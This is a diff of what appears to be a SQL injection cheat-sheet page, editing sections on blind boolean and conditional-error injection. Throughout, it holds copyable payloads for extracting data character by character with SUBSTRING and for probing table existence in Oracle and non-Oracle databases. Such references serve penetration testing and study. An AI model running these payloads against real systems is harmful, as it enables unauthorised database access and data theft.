@@ -216,7 +216,7 @@ To successfully acomplish the blind attack, the boolean conditions can help. It 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT06')">.C1.</button>
 
 <b>NOTE:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached 
-hits the FALSE statement.
+hits the FALSE statement the lenght is founded.
 <br>
 > <u>CHECK CHARACTERS VALUE USING A METHOD "GREATHER THAN" AND "EQUALS" ?</u>
 <b>C1: </b><p id="BAT11"><mark>' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) > 'value</mark></p>
@@ -240,8 +240,8 @@ greather than the value...
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT08')">.C1.</button>
 
-So, it is the same as saying, first character in the value of column_name X is equal to "A". We need to
-iterate more times with each letter, number, etc. For that reason a pre-req is to know the value lenght. 
+So, it is the same as saying, first character in the value of column_name X is equal to "A". We need to iterate more times 
+with each letter, number, etc. For that reason a pre-req is to know the value lenght. 
 
 <b><u>CLUSTER BOMB ATTACK !</u></b> - two positions
 
@@ -255,21 +255,21 @@ values are correct = TRUE.
 <details>
 <summary>CONDITIONAL ERRORS</summary>
 
-<b>NOTE:</b> [HTTP/2 500 Internal Server Error], error will act similar to the TRUE/FALSE logic. If error
-appears, FALSE If not, TRUE. 
+<b>NOTE:</b> [HTTP/2 500 Internal Server Error], error will act similar to the TRUE/FALSE logic. If error appears, FALSE If not, 
+TRUE. 
 
-> <u>CONFIRM SERVER IS INTERPRETING THE INJECTION AS A SQL QUERY</u>
+> <u>CONFIRM SERVER IS INTERPRETING THE INJECTION AS A SQL QUERY</u><br>
 <b>C1: NON-ORACLE </b><p id="BAT008"><mark>'||(SELECT '')||'</mark></p>
 <b>C2: ORACLE </b><p id="BAT009"><mark>'||(SELECT '' FROM dual)||'</mark></p>
 	
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT008')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT009')">.C2.</button>
 
-> <u>CONFIRM IF TABLE EXISTS ?</u>
+> <u>CONFIRM IF TABLE EXISTS ?</u><br>
 <b>C1: NON-ORACLE </b><p id="BAT010"><mark>'||(SELECT '' FROM TABLE_NAME WHERE ROWNUM = 1)||'</mark></p>
 <b>SAMPLE: </b><mark>'||(SELECT '' FROM users WHERE ROWNUM = 1)||'</mark>
 
-<b>NOTE:</b> WHERE ROWNUM = 1 prevents break concatenation. If error is present table does not exist, if not
-you can infer the table exist. 
+<b>NOTE:</b> WHERE ROWNUM = 1 prevents break concatenation. If error is present table does not exist, if not you can infer 
+the table exist. 
 	
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT010')">.C1.</button>
 
